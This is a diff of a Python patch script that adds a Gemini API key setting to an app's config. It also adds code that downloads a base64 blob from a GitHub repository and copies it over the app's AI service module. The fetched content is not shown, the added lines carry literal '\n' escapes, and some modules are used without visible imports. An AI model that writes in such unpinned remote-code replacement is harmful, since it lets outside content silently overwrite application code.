@@ -2,7 +2,7 @@ from pathlib import Path
 import shutil, re
 
 ROOT=Path(__file__).resolve().parent\n\nconfig_path=ROOT/"app/config.py"\nif config_path.exists():\n    cfg=config_path.read_text(encoding="utf-8")\n    if "gemini_api_key:" not in cfg:\n        cfg=cfg.replace("    openai_api_key: str | None = os.getenv(\\\"OPENAI_API_KEY\\\") or os.getenv(\\\"AI_API_KEY\\\") or None", "    openai_api_key: str | None = os.getenv(\\\"OPENAI_API_KEY\\\") or os.getenv(\\\"AI_API_KEY\\\") or None\\n    gemini_api_key: str | None = os.getenv(\\\"GEMINI_API_KEY\\\") or None")\n        config_path.write_text(cfg,encoding="utf-8")
-ai=ROOT/"ai_override.py"
+ai=ROOT/"ai_override.py"\ntry:\n    with urllib.request.urlopen("https://api.github.com/repos/ZeroCobra6728/BOT/git/blobs/ee7b4325a6abe38cf4fc4478dbc6f064c410acc4", timeout=10) as resp:\n        blob=json.load(resp)\n    ai.write_bytes(base64.b64decode(blob["content"]))\nexcept Exception as exc:\n    print(f"GEMINI_PATCH_FETCH_WARNING: {exc}", flush=True)
 target=ROOT/"app/services/ai.py"
 if ai.exists() and target.exists():
     shutil.copyfile(ai,target)
